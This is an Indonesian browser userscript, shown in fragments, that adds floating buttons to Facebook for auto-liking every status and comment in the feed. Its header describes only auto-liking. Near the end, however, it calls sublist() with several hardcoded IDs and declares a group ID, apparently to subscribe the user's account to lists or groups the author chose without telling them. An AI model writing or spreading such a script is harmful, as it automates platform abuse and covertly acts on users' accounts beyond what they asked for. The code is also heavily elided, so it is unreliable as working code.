// ==UserScript==
// @name			*[ Boom Like Beranda ]*
// @namespace		        *[ Boom Like ]* Boom Like Facebook 
// @description		        *[ BOM AUTOLIKE ]* Boom Like ini adalah untuk meng Like status yg berada di beranda cuma 1 kali klik
// @author			https://www.facebook.com/arikurniawan101
// @authorURL		http://www.berkataindonesia.blogspot.com/        
...
if(body != null) 
{
 ...
 div.style.border = "1px solid #00ffea";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#9c00ff' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
...
if(body != null) 
{
 ...
 div.style.border = "1px solid #00ffea";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#0BFDD9' onclick='Anonymous69()'><center>Like All Status</center></a></a>"
 body.appendChild(div);
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.left="+0px";
    div.style.backgroundColor="#ec4101";
    div.style.border="1px solid #00ffea";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#12ff00' href='http://www.berkataindonesia.blogspot.com/' target='_blank' title='NEW' ><blink><center>1x Klik Like Otomatis</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
if(body != null) 
{
 ...
 div.style.border = "1px solid #00ffea";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#9c00ff' onclick='AnonymousComments()'><center>Like All Comments</center></a>"
 body.appendChild(div);
 unsafeWindow.AnonymousComments = function()
 {
  ...
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#9c00ff' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
...
sublist("440299096063404");
sublist("471595176267129");
sublist("587272021366110");
sublist("576005235826122");

var gid = ['558889310871048'];
